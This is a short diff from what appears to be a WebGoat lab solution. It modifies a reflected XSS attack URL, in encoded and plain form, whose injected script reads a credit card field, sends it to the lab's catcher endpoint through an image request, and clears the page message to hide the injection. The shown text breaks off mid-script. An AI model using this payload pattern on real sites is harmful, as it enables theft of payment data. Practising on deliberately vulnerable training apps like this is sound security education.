@@ -1,7 +1,7 @@
 encoded url:
-http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=++++++++++++++++++++++++++++++++++++++++++++++++++%0D%0A%3Cscript%3E%0D%0A%09%28function+hack%28%29+%7B%0D%0A%09%09var+creditCardNumber+%3D+encodeURI%28document.getElementsByName%28%27field2%27%29%5B0%5D.value%29%3B%0D%0A%09%09var+url+%3D+%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26card%3D%22+%2B+creditCardNumber%3B%0D%0A%09%09var+XSSImage+%3D+new+Image%28%29%3B%0D%0A%09%09XSSImage.src+%3D+url%3B%0D%0A%09%09var+message+%3D+document.getElementById%28%27message%27%29%3B%0D%0A%09%09while+%28message.firstChild%29+%7B%0D%0A%09%09%09message.removeChild%28message.firstChild%29%3B%0D%0A%09%09%7D%0D%0A%09%7D%29%28%29%3B%0D%0A%3C%2Fscript%3E
+http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=111++++++++++++++++++++++++++++++++++++++++++++++++++%0D%0A%3Cscript%3E%0D%0A%09%28function+hack%28%29+%7B%0D%0A%09%09var+creditCardNumber+%3D+encodeURI%28document.getElementsByName%28%27field2%27%29%5B0%5D.value%29%3B%0D%0A%09%09var+url+%3D+%22http%3A%2F%2Flocalhost%3A8090%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26card%3D%22+%2B+creditCardNumber%3B%0D%0A%09%09var+XSSImage+%3D+new+Image%28%29%3B%0D%0A%09%09XSSImage.src+%3D+url%3B%0D%0A%09%09var+message+%3D+document.getElementById%28%27message%27%29%3B%0D%0A%09%09while+%28message.firstChild%29+%7B%0D%0A%09%09%09message.removeChild%28message.firstChild%29%3B%0D%0A%09%09%7D%0D%0A%09%7D%29%28%29%3B%0D%0A%3C%2Fscript%3E
 unencoded url:
-http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=                                                  
+http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=123&field1=111                                                  
 <script>
 	(function hack() {
 		var creditCardNumber = encodeURI(document.getElementsByName('field2')[0].value);
